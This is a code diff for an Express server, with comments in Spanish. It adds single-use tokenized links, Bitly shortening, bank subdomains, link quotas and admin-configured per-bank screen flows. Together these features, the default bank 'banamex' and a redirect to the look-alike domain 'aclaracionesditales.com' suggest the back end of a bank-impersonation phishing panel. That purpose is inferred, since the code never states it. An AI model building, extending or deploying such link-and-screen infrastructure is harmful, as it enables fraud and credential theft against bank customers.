@@ -15,6 +15,9 @@ import multer from 'multer';
 import path from 'path';
 import fs from 'fs';
 import { z } from 'zod';
+import { linkTokenService } from './services/linkToken';
+import { linkQuotaService } from './services/linkQuota';
+import { bitlyService } from './services/bitly';
 
 // Store active connections
 const clients = new Map<string, WebSocket>();
@@ -128,6 +131,80 @@ export async function registerRoutes(app: Express): Promise<Server> {
       console.error('Error en limpieza automática de usuarios:', error);
     }
   }, 6 * 60 * 60 * 1000); // Ejecutar cada 6 horas
+
+  // Middleware de validación de tokens de un solo uso
+  app.get('/client/:token', async (req, res) => {
+    try {
+      const { token } = req.params;
+      
+      // Validar y consumir el token
+      const tokenResult = await linkTokenService.validateAndConsumeToken(token, {
+        ip: req.ip || req.connection.remoteAddress || 'unknown',
+        userAgent: req.headers['user-agent'] || 'unknown'
+      });
+
+      // Si el token es inválido, retornar error apropiado
+      if (!tokenResult.valid) {
+        if (tokenResult.reason === 'already_used' || tokenResult.reason === 'expired' || tokenResult.reason === 'cancelled') {
+          return res.status(410).json({ 
+            error: 'Link no válido',
+            reason: tokenResult.reason === 'already_used' ? 'Este link ya fue utilizado' :
+                    tokenResult.reason === 'expired' ? 'Este link ha expirado' :
+                    'Este link ha sido cancelado'
+          });
+        }
+        return res.status(404).json({ 
+          error: 'Link no encontrado',
+          reason: 'El link proporcionado no existe'
+        });
+      }
+
+      // Token válido, obtener o crear la sesión
+      let session = tokenResult.sessionId ? 
+        await storage.getSessionById(tokenResult.sessionId) : 
+        null;
+
+      // Si no existe sesión, crearla
+      if (!session) {
+        // Generar código de 8 dígitos para sessionId y folio
+        let sessionId = '';
+        for (let i = 0; i < 8; i++) {
+          sessionId += Math.floor(Math.random() * 10).toString();
+        }
+
+        // Crear la sesión con datos del token
+        session = await storage.createSession({
+          sessionId,
+          banco: tokenResult.bankCode || 'banamex',
+          folio: sessionId,
+          pasoActual: ScreenType.FOLIO,
+          createdBy: tokenResult.createdBy || 'system',
+          executiveId: null
+        });
+
+        // Actualizar el token con el sessionId creado
+        await linkTokenService.updateTokenSession(token, sessionId);
+
+        console.log(`[Links] Nueva sesión creada desde token: ${sessionId}, banco: ${session.banco}`);
+      }
+
+      // Obtener la URL base desde la configuración del sitio
+      const siteConfig = await storage.getSiteConfig();
+      const baseClientUrl = siteConfig?.baseUrl || 'https://aclaracionesditales.com';
+      
+      // Redirigir al usuario a la sesión
+      const redirectUrl = `${baseClientUrl}/${session.sessionId}`;
+      console.log(`[Links] Redirigiendo a sesión: ${redirectUrl}`);
+      
+      res.redirect(302, redirectUrl);
+    } catch (error: any) {
+      console.error('[Links] Error procesando token:', error);
+      res.status(500).json({ 
+        error: 'Error procesando el link',
+        message: error.message 
+      });
+    }
+  });
 
   // API endpoints
   // Rutas de administración de usuarios
@@ -4004,6 +4081,220 @@ _Fecha: ${new Date().toLocaleString('es-MX')}_
     } catch (error) {
       console.error("Error obteniendo conversaciones:", error);
       res.status(500).json({ message: "Error al obtener conversaciones" });
+    }
+  });
+
+  // ============================================================
+  // SISTEMA DE GESTIÓN DE LINKS CON SUBDOMINIOS Y BITLY
+  // ============================================================
+
+  // Crear un nuevo link con subdominio y acortamiento Bitly
+  app.post("/api/links", async (req, res) => {
+    if (!req.isAuthenticated() || !req.user) {
+      return res.status(401).json({ message: "No autenticado" });
+    }
+
+    try {
+      const { bankCode, sessionId, metadata } = req.body;
+
+      if (!bankCode) {
+        return res.status(400).json({ message: "Se requiere el código del banco" });
+      }
+
+      const link = await linkTokenService.createLink({
+        userId: req.user.id,
+        bankCode,
+        sessionId,
+        metadata
+      });
+
+      res.json({
+        success: true,
+        link: {
+          id: link.id,
+          token: link.token,
+          originalUrl: link.originalUrl,
+          shortUrl: link.shortUrl || link.originalUrl,
+          expiresAt: link.expiresAt
+        }
+      });
+    } catch (error: any) {
+      console.error("Error creando link:", error);
+      res.status(500).json({ message: error.message || "Error al crear link" });
+    }
+  });
+
+  // Obtener historial de links del usuario
+  app.get("/api/links/history", async (req, res) => {
+    if (!req.isAuthenticated() || !req.user) {
+      return res.status(401).json({ message: "No autenticado" });
+    }
+
+    try {
+      const limit = parseInt(req.query.limit as string) || 50;
+      const history = await linkTokenService.getLinkHistory(req.user.id, limit);
+      
+      res.json({
+        success: true,
+        links: history
+      });
+    } catch (error: any) {
+      console.error("Error obteniendo historial de links:", error);
+      res.status(500).json({ message: error.message || "Error al obtener historial" });
+    }
+  });
+
+  // Obtener cuota semanal de links
+  app.get("/api/links/quota", async (req, res) => {
+    if (!req.isAuthenticated() || !req.user) {
+      return res.status(401).json({ message: "No autenticado" });
+    }
+
+    try {
+      const usage = await linkQuotaService.getCurrentUsage(req.user.id);
+      
+      res.json({
+        success: true,
+        quota: usage
+      });
+    } catch (error: any) {
+      console.error("Error obteniendo cuota:", error);
+      res.status(500).json({ message: error.message || "Error al obtener cuota" });
+    }
+  });
+
+  // Extender duración de un link
+  app.post("/api/links/:id/extend", async (req, res) => {
+    if (!req.isAuthenticated() || !req.user) {
+      return res.status(401).json({ message: "No autenticado" });
+    }
+
+    try {
+      const linkId = parseInt(req.params.id);
+      const { minutes } = req.body;
+
+      if (!minutes || minutes < 1 || minutes > 360) {
+        return res.status(400).json({ message: "Los minutos deben estar entre 1 y 360" });
+      }
+
+      await linkTokenService.extendLink(linkId, minutes);
+
+      res.json({
+        success: true,
+        message: `Link extendido por ${minutes} minutos`
+      });
+    } catch (error: any) {
+      console.error("Error extendiendo link:", error);
+      res.status(500).json({ message: error.message || "Error al extender link" });
+    }
+  });
+
+  // Cancelar un link
+  app.post("/api/links/:id/cancel", async (req, res) => {
+    if (!req.isAuthenticated() || !req.user) {
+      return res.status(401).json({ message: "No autenticado" });
+    }
+
+    try {
+      const linkId = parseInt(req.params.id);
+      await linkTokenService.cancelLink(linkId);
+
+      res.json({
+        success: true,
+        message: "Link cancelado exitosamente"
+      });
+    } catch (error: any) {
+      console.error("Error cancelando link:", error);
+      res.status(500).json({ message: error.message || "Error al cancelar link" });
+    }
+  });
+
+  // Configurar subdominios de bancos (solo admin)
+  app.get("/api/bank-subdomains", async (req, res) => {
+    if (!req.isAuthenticated() || !req.user || req.user.role !== 'admin') {
+      return res.status(403).json({ message: "No autorizado" });
+    }
+
+    try {
+      const subdomains = await storage.getBankSubdomains();
+      res.json({ success: true, subdomains });
+    } catch (error: any) {
+      console.error("Error obteniendo subdominios:", error);
+      res.status(500).json({ message: error.message || "Error al obtener subdominios" });
+    }
+  });
+
+  app.post("/api/bank-subdomains", async (req, res) => {
+    if (!req.isAuthenticated() || !req.user || req.user.role !== 'admin') {
+      return res.status(403).json({ message: "No autorizado" });
+    }
+
+    try {
+      const { bankCode, subdomain } = req.body;
+      
+      if (!bankCode || !subdomain) {
+        return res.status(400).json({ message: "Se requieren bankCode y subdomain" });
+      }
+
+      await storage.upsertBankSubdomain({ bankCode, subdomain, isActive: true });
+
+      res.json({
+        success: true,
+        message: "Subdominio configurado exitosamente"
+      });
+    } catch (error: any) {
+      console.error("Error configurando subdominio:", error);
+      res.status(500).json({ message: error.message || "Error al configurar subdominio" });
+    }
+  });
+
+  // Configuración de flujos de pantallas por banco (solo admin)
+  app.get("/api/screen-flows/:bankCode", async (req, res) => {
+    if (!req.isAuthenticated() || !req.user) {
+      return res.status(401).json({ message: "No autenticado" });
+    }
+
+    try {
+      const { bankCode } = req.params;
+      const flow = await storage.getBankScreenFlow(bankCode);
+      
+      res.json({
+        success: true,
+        flow: flow || null
+      });
+    } catch (error: any) {
+      console.error("Error obteniendo flujo de pantallas:", error);
+      res.status(500).json({ message: error.message || "Error al obtener flujo" });
+    }
+  });
+
+  app.put("/api/screen-flows/:bankCode", async (req, res) => {
+    if (!req.isAuthenticated() || !req.user || req.user.role !== 'admin') {
+      return res.status(403).json({ message: "No autorizado" });
+    }
+
+    try {
+      const { bankCode } = req.params;
+      const { flowConfig } = req.body;
+
+      if (!flowConfig || !Array.isArray(flowConfig)) {
+        return res.status(400).json({ message: "flowConfig debe ser un array" });
+      }
+
+      await storage.upsertBankScreenFlow({
+        bankCode,
+        flowConfig,
+        isActive: true,
+        createdBy: req.user.id
+      });
+
+      res.json({
+        success: true,
+        message: "Flujo de pantallas configurado exitosamente"
+      });
+    } catch (error: any) {
+      console.error("Error configurando flujo de pantallas:", error);
+      res.status(500).json({ message: error.message || "Error al configurar flujo" });
     }
   });
 
